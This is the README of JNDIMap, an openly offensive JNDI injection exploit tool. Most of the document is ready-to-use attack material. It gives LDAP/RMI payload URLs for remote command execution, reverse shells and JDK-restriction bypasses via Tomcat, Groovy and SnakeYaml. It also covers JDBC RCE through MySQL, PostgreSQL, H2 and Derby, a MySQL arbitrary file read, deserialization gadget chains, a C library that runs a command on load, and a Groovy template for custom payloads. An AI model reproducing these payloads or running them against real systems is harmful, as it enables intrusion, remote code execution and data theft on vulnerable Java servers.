# JNDIMap

JNDIMap is a JNDI injection exploit tool that supports RMI and LDAP protocols, including a variety of methods to bypass higher-version JDK

Features

- DNS Log
- execute command
- native reverse shell (Windows supported)
- load custom class bytecode
- Tomcat/Groovy/SnakeYaml bypass
- Commons DBCP/Tomcat DBCP/Alibaba Druid/HikariCP JDBC RCE
- NativeLibLoader (load native library)
- MLet (detect classes in classpath)
- LDAP deserialization
- custom JNDI payload (based on Groovy Language)

## Build

There are no releases yet, so you need to build it manually (JDK 8)

```bash
git clone https://github.com/X1r0z/JNDIMap
cd JNDIMap
mvn package -Dmaven.test.skip=true
```

## Usage

```bash
Usage: java -jar JNDIMap.jar [-i <ip>] [-r <rmiPort>] [-l <ldapPort>] [-p <httpPort>] [-u <url>] [-f <file>] [-h]
````

`-i`: IP address to listen on (i.e. the codebase, must be specified as an IP that can be reached by the target, e.g. `192.168.1.100`, note that `0.0.0.0` is not available)

`-r`: RMI server listening port, default is `1099`

`-l`: LDAP server listening port, default is `1389`

`-p`: HTTP server listening port, default is `3456`

`-u`: specify the JNDI route manually, e.g. `/Basic/Command/open -a Calculator` (The JNDI URL is not completely controllable in some cases)

`-f`: path to the Groovy script, used to write custom JNDI payloads

`-h`: show usage

## Feature

Please note that all the Base64 passed in is **Base64 URL encoded**, i.e. replace `+` and `/` with `-` and `_`

Most parameters support automatic Base64 URL decoding, that is, you can directly pass in plain text (command/IP/port/URL) or Base64 URL encoded content (some routes only accept Base64 URL encoded parameters, which will be specially noted below)

The following routes support both RMI and LDAP protocols except `/Deserialize/*` (LDAP deserialization)

For the RMI protocol, simply replace `ldap://` with `rmi://` in the URL

### Basic

Directly load remote classes via JNDI Reference

The Java version must be less than 8u121 (RMI protocol) or 8u191 (LDAP protocol)

```bash
# DNS request
ldap://127.0.0.1:1389/Basic/DNSLog/xxx.dnslog.cn
ldap://127.0.0.1:1389/Basic/DNSLog/eHh4LmRuc2xvZy5jbg==

# execute command
ldap://127.0.0.1:1389/Basic/Command/open -a Calculator
ldap://127.0.0.1:1389/Basic/Command/b3BlbiAtYSBDYWxjdWxhdG9y

# load custom class bytecode

# load via URL parameters
ldap://127.0.0.1:1389/Basic/FromCode/<base64-url-encoded-java-bytecode>
# load from the server running JNDIMap
ldap://127.0.0.1:1389/Basic/FromPath/<base64-url-encoded-path-to-evil-class-file>

# native reverse shell (Windows supported)
ldap://127.0.0.1:1389/Basic/ReverseShell/127.0.0.1/4444
ldap://127.0.0.1:1389/Basic/ReverseShell/MTI3LjAuMC4x/NDQ0NA==
```

### Bypass

Use the following methods to bypass higher-version JDK restrictions, support all Basic features

- Tomcat ELProcessor
- Groovy ClassLoader/Shell
- SnakeYaml

All of the above methods rely on BeanFactory, so the Tomcat version must be less than 8.5.79

```bash
# Tomcat Bypass
ldap://127.0.0.1:1389/TomcatBypass/Command/open -a Calculator

# Groovy Bypass
ldap://127.0.0.1:1389/GroovyClassLoader/Command/open -a Calculator
ldap://127.0.0.1:1389/GroovyShell/Command/open -a Calculator

# SnakeYaml Bypass
ldap://127.0.0.1:1389/SnakeYaml/Command/open -a Calculator
```

### MLet

Detect classes in classpath via MLet

If the class `com.example.TestClass` exists, the HTTP server will receive a `/com/example/TestClass_exists.class` request

```bash
ldap://127.0.0.1:1389/MLet/com.example.TestClass
```

### NativeLibLoader

Load native library on the target server via NativeLibLoader

You need to write a dll/so/dylib to the target machine in advance by other methods (e.g. file upload)

Please note that the path passed in is an absolute path and cannot contain the file extension

For example: if `/tmp/evil.so` exists on the server, the path is `/tmp/evil`

```bash
ldap://127.0.0.1:1389/NativeLibLoader/<base64-url-encoded-path-to-native-library>
```

source code of the native library, written in C

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

__attribute__ ((__constructor__)) void preload (void){
    system("open -a Calculator");
}
```

compile

```bash
# macOS
gcc -shared -fPIC exp.c -o exp.dylib

# Linux
gcc -shared -fPIC exp.c -o exp.so
```

### JDBC RCE

Support JDBC RCE for the following database connection pools

- Commons DBCP
- Tomcat DBCP
- Alibaba Druid
- HikariCP

Replace Factory in the URL with one of CommonsDBCP1/CommonsDBCP2/TomcatDBCP1/TomcatDBCP2/Druid/HikariCP

#### MySQL

**MySQL JDBC Deserialization**

```bash
# detectCustomCollations (5.1.19-5.1.48, 6.0.2-6.0.6)
ldap://127.0.0.1:1389/Factory/MySQL/Deserialize1/127.0.0.1/3306/root

# ServerStatusDiffInterceptor

# 5.1.11-5.1.48
ldap://127.0.0.1:1389/Factory/MySQL/Deserialize2/127.0.0.1/3306/root

# 6.0.2-6.0.6
ldap://127.0.0.1:1389/Factory/MySQL/Deserialize3/127.0.0.1/3306/root

# 8.0.7-8.0.19
ldap://127.0.0.1:1389/Factory/MySQL/Deserialize4/127.0.0.1/3306/root
```

JDBC URL (for reference)

```bash
# detectCustomCollations (5.1.19-5.1.48, 6.0.2-6.0.6)
jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true&user=123

# ServerStatusDiffInterceptor

# 5.1.11-5.1.48
jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=test

# 6.0.2-6.0.6
jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=test

# 8.0.7-8.0.19
jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=test
```

**MySQL Client Arbitrary File Read**

```bash
# all versions
ldap://127.0.0.1:1389/Factory/MySQL/FileRead/127.0.0.1/3306/root
```

JDBC URL (for reference)

```bash
# all versions
jdbc:mysql://127.0.0.1:3306/test?allowLoadLocalInfile=true&allowUrlInLocalInfile=true&allowLoadLocalInfileInPath=/&maxAllowedPacket=655360
```

The above two methods require a malicious MySQL server to be used

[https://github.com/4ra1n/mysql-fake-server](https://github.com/4ra1n/mysql-fake-server)

[https://github.com/rmb122/rogue_mysql_server](https://github.com/rmb122/rogue_mysql_server)

[https://github.com/fnmsd/MySQL_Fake_Server](https://github.com/fnmsd/MySQL_Fake_Server)

#### PostgreSQL

Instantiate ClassPathXmlApplicationContext via the socketFactory and socketFactoryArg parameters of the PostgreSQL JDBC URL to achieve RCE

```bash
ldap://127.0.0.1:1389/Factory/PostgreSQL/Command/open -a Calculator
````

#### H2

Execute SQL statements via the INIT parameter of the H2 JDBC URL

Support three methods: CREATE ALIAS + Java/Groovy, CREATE TRIGGER + JavaScript

```bash
ldap://127.0.0.1:1389/Factory/H2/Java/open -a Calculator
ldap://127.0.0.1:1389/Factory/H2/Groovy/open -a Calculator
ldap://127.0.0.1:1389/Factory/H2/JavaScript/open -a Calculator
```

#### Derby

**Derby SQL RCE**

Support executing commands and native reverse shell

```bash
# 1. load remote jar and create procedures (will automatically create the database)
ldap://127.0.0.1:1389/Factory/Derby/Install/<database>

# 2. execute command/native reverse shell
ldap://127.0.0.1:1389/Factory/Derby/Command/<database>/open -a Calculator
ldap://127.0.0.1:1389/Factory/Derby/ReverseShell/<database>/ReverseShell/127.0.0.1/4444

# 3. drop the database to release memory
ldap://127.0.0.1:1389/Factory/Derby/Drop/<database>
```

Please note that the connectionInitSql parameter of HikariCP does not support executing multiple SQL statements at once, so the **Install** process above needs to be written separately

```bash
# 1. load remote jar (will automatically create the database)
ldap://127.0.0.1:1389/HikariCP/Derby/InstallJar/<database>

# 2. add the jar to the classpath
ldap://127.0.0.1:1389/HikariCP/Derby/AddClassPath/<database>

# 3. create a procedure to execute commands
ldap://127.0.0.1:1389/HikariCP/Derby/CreateCmdProc/<database>

# 4. create a procedure to execute native reverse shell
ldap://127.0.0.1:1389/HikariCP/Derby/CreateRevProc/<database>

# subsequent JNDI URL is the same as above
```

In order to prevent malicious jars from landing, JNDIMap chooses to use the `jdbc:derby:memory:<database>` form of JDBC URL to create the database in memory

Therefore, it is best not to execute the Install/InstallJar route multiple times, and remember to Drop the database to release memory

**Derby Master-Slave Replication Deserialization RCE**

Although JNDI itself supports deserialization, it is not very meaningful, and may be useful in some extreme scenarios (e.g. filtering the LDAP protocol and only supporting RMI)

```bash
# 1. create an in-memory database
ldap://127.0.0.1:1389/Factory/Derby/Create/<database>

# 2. start the malicious Derby Server quickly using JNDIMap
java -cp JNDIMap.jar map.jndi.server.DerbyServer -g "/CommonsCollectionsK1/Command/open -a Calculator"

# 3. specify Slave information, database is the name of the database created above
ldap://127.0.0.1:1389/Factory/Derby/Slave/<ip>/<port>/<database>
```

Start the built-in malicious Derby Server

```bash
Usage: java -cp JNDIMap.jar map.jndi.server.DerbyServer [-p <port>] [-g <gadget>] [-f <file>] [-h]
```

`-p`: Derby Server listening port, default is `4851`

`-g`: specify gadget, e.g. `/CommonsCollectionsK1/Command/open -a Calculator` (i.e. `/Deserialize/*` series routes)

`-f`: specify custom serialization data file

`-h`: show usage

### Deserialize

Supports Java deserialization via LDAP protocol (RMI protocol is not supported)

JNDIMap has built-in the following gadgets, and also supports custom data deserialization

- CommonsCollections K1-K4
- CommonsBeanutils (1.8.3 + 1.9.4)
- Fastjson (1.2.x + 2.0.x)
- Jackson

```bash
# custom data deserialization
ldap://127.0.0.1:1389/Deserialize/<base64-url-encoded-serialize-data>

# CommonsCollectionsK1 deserialization (3.1 + TemplatesImpl), supports command execution and native reverse shell
ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK1/Command/open -a Calculator
ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK1/ReverseShell/127.0.0.1/4444

# CommonsCollectionsK2 deserialization (4.0 + TemplatesImpl), same as above
ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK2/Command/open -a Calculator

# CommonsCollectionsK3 deserialization (3.1 + Runtime.exec), only supports command execution
ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK3/Command/open -a Calculator

# CommonsCollectionsK4 deserialization (4.0 + Runtime.exec), same as above
ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK4/Command/open -a Calculator

# CommonsBeanutils deserialization
# No need for commons-collections dependency, use TemplatesImpl, support command execution and native reverse shell
# According to the different serialVersionUID of BeanComparator, it is divided into two versions: 1.8.3 and 1.9.4

# 1.8.3
ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils183/Command/open -a Calculator
ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils183/ReverseShell/127.0.0.1/4444

# 1.9.4
ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils194/Command/open -a Calculator
ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils194/ReverseShell/127.0.0.1/4444

# Jackson native deserialization
# Use JdkDynamicAopProxy to optimize instability issues, need spring-aop dependency
ldap://127.0.0.1:1389/Deserialize/Jackson/Command/open -a Calculator
ldap://127.0.0.1:1389/Deserialize/Jackson/ReverseShell/127.0.0.1/4444

# Fastjson native deserialization

# Fastjson1: all versions (1.2.x)
ldap://127.0.0.1:1389/Deserialize/Fastjson1/Command/open -a Calculator
ldap://127.0.0.1:1389/Deserialize/Fastjson1/ReverseShell/127.0.0.1/4444

# Fastjson2: <= 2.0.26
ldap://127.0.0.1:1389/Deserialize/Fastjson2/Command/open -a Calculator
ldap://127.0.0.1:1389/Deserialize/Fastjson2/ReverseShell/127.0.0.1/4444
```

### Custom

JNDIMap supports writing custom JNDI payloads with [Groovy](https://groovy-lang.org/) language

Groovy script (using H2 RCE as an example)

```groovy
import javax.naming.Reference
import javax.naming.StringRefAddr

def list = []
list << "CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd)\\;return \"test\"\\;}'"
list << "CALL EXEC('$args')" // parameters are passed in through the args variable


def url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=${list.join('\\;')}\\;"

def ref = new Reference("javax.sql.DataSource", "com.zaxxer.hikari.HikariJNDIFactory", null)
ref.add(new StringRefAddr("driverClassName", "org.h2.Driver"))
ref.add(new StringRefAddr("jdbcUrl", url))

return ref // return Reference object
```

Start JNDIMap

```bash
java -jar JNDIMap.jar -f /path/to/evil.groovy
```

Achieve RCE via the following JNDI URL

```bash
# supports passing parameters to Groovy scripts manually
ldap://127.0.0.1:1389/Custom/<args>
```

In some cases, the JNDI URL is not completely controllable, so you can specify the `-u` parameter

```bash
java -jar JNDIMap.jar -f /path/to/evil.groovy -u "/Custom/open -a Calculator"
```

Then trigger via any JNDI URL

```bash
ldap://127.0.0.1:1389/x
```

## Reference

[https://tttang.com/archive/1405/](https://tttang.com/archive/1405/)

[https://paper.seebug.org/1832/](https://paper.seebug.org/1832/)

[https://xz.aliyun.com/t/12846](https://xz.aliyun.com/t/12846)

[http://www.lvyyevd.cn/archives/derby-shu-ju-ku-ru-he-shi-xian-rce](http://www.lvyyevd.cn/archives/derby-shu-ju-ku-ru-he-shi-xian-rce)

[https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson 与原生反序列化/](https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/)

[https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson 与原生反序列化-二/](https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/)

[https://www.yulegeyu.com/2022/11/12/Java 安全攻防之老版本 Fastjson 的一些不出网利用/](https://www.yulegeyu.com/2022/11/12/Java%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E4%B9%8B%E8%80%81%E7%89%88%E6%9C%ACFastjson-%E7%9A%84%E4%B8%80%E4%BA%9B%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/)

[https://gv7.me/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/](https://gv7.me/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/)